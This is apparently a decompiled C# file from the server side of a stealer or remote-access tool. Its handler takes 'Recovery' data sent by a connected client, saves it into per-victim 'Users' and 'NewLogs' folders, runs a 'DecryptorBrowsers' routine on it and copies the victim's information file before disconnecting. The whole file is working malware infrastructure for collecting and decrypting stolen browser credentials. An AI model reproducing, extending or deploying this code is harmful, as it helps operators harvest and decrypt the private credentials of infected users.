using System;
using System.Drawing;
using System.IO;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages
{
	// Token: 0x0200004A RID: 74
	internal class HandlerRecovery1
	{
		// Token: 0x060001CA RID: 458 RVA: 0x0001CE50 File Offset: 0x0001B050
		public static void Read(Clients clients, object[] array)
		{
			string ip = clients.IP;
			string str = "Save logs in: Users\\";
			object obj = array[1];
			Methods.AppendLogs(ip, str + ((obj != null) ? obj.ToString() : null) + "\\Recovery", Color.MediumPurple);
			string str2 = "Users\\";
			object obj2 = array[1];
			DynamicFiles.Save(str2 + ((obj2 != null) ? obj2.ToString() : null) + "\\Recovery", (object[])array[2]);
			string str3 = "NewLogs\\";
			object obj3 = array[1];
			DynamicFiles.Save(str3 + ((obj3 != null) ? obj3.ToString() : null), (object[])array[2]);
			string str4 = "Users\\";
			object obj4 = array[1];
			DecryptorBrowsers.Start(str4 + ((obj4 != null) ? obj4.ToString() : null) + "\\Recovery");
			string str5 = "NewLogs\\";
			object obj5 = array[1];
			DecryptorBrowsers.Start(str5 + ((obj5 != null) ? obj5.ToString() : null));
			File.Copy("Users\\" + (array[1] as string) + "\\Information.txt", "NewLogs\\" + (array[1] as string) + "\\InformationLeb.txt");
			File.Copy("Users\\" + (array[1] as string) + "\\Information.txt", "Users\\" + (array[1] as string) + "\\Recovery\\InformationLeb.txt");
			clients.Disconnect();
		}
	}
}
